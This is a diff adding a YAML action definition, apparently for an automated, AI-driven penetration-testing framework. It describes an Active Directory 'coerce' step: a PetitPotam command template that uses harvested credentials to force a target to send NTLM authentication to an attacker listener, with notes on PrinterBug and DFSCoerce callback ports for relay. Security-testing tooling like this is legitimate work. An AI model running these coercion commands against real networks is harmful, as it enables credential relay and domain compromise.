@@ -1,0 +1,21 @@
+name: coerce
+category: ad
+description: Force NTLM authentication from target (PetitPotam, PrinterBug, DFSCoerce)
+preconditions:
+  - has_cred
+  - os==windows
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+  listener_ip: from_engagement.attacker_ip
+  username: from_cred.username
+  password: from_cred.password
+command_template: "python3 PetitPotam.py {listener_ip} {target_ip} -u '{username}' -p '{password}'"
+parser: null
+expected_effects:
+  - ntlm_auth_coerced
+falsifier:
+  pattern: "Attack Failed|ERROR"
+  timeout: 30
+model_tier: haiku
+mechanism: "Forces target to authenticate to attacker via NTLM. PrinterBug (MS-RPRN) callbacks on port 445. PetitPotam (MS-EFSRPC) callbacks vary — check listener port. DFSCoerce (MS-DFSNM) similar. Must match coercion method to relay listener port."
